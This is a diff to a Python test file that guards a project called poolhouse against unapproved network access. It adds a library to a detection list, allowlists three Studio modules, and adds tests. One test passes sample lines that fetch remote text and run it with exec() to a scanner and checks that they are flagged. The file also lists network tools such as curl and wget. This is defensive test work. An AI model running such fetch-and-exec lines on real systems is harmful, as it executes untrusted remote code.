@@ -22,7 +22,7 @@ import pytest
 
 ROOT = Path(__file__).resolve().parent.parent / "src" / "poolhouse"
 
-LIBRARIES = {"urllib.request", "http.client", "requests", "httpx", "aiohttp", "huggingface_hub",
+LIBRARIES = {"urllib.request", "http.client", "requests", "httpx", "httpx2", "aiohttp", "huggingface_hub",
              "ftplib", "smtplib", "telnetlib", "urllib3", "websocket", "websockets"}
 CALLS = {"socket.create_connection", "urllib.request.urlopen", "urlopen"}
 PROGRAMS = {"curl", "wget", "scp", "sftp", "rsync"}
@@ -37,6 +37,9 @@ ALLOWED: dict[str, str] = {
     "build_update.py": "its one hand-run git fetch is from an origin that is a directory on this machine "
                        "(Path(url).is_dir()); every other origin goes through fleet/updates.check_remote "
                        "and its git_in, which runs net/git and its host policy",
+    "fleet/studio_library.py": "fixed enrolled HTTPS package exchange, sealed responses and exact redirect guard",
+    "fleet/studio_transport.py": "fixed enrolled Studio actions, current member identity, exact TLS and sealed request binding",
+    "fleet/studio_webhook_setup.py": "fixed loopback sender, exact current TLS identity/port, HMAC body and no redirects",
     "fleet/serving.py": "a port check on loopback",
     "fleet/invite_client.py": "single-use LAN invitation; every resolved address is checked, the selected sockaddr is frozen and TLS is pinned before HTTP",
     "fleet/project_client.py": "sealed project source from a LAN member; exact redirects and require_local_url at every request",
@@ -235,3 +238,16 @@ def test_http_exception_import_does_not_open_a_connection(tmp_path):
     path = tmp_path / "m.py"
     path.write_text("from http.client import HTTPException\n")
     assert findings(path) == []
+
+
+def test_httpx2_is_detected_by_network_scan(tmp_path):
+    module = tmp_path / "transport.py"
+    module.write_text("import httpx2\nfrom httpx2 import AsyncClient\n")
+    assert findings(module) == ["import httpx2", "from httpx2 import ..."]
+
+
+def test_httpx2_download_execution_still_flagged():
+    from poolhouse.guard.fetchexec import scan
+
+    assert scan("exec(httpx2.get('https://unselected.invalid').text)")
+    assert scan("payload = httpx2.get('https://unselected.invalid').text\nexec(payload)")
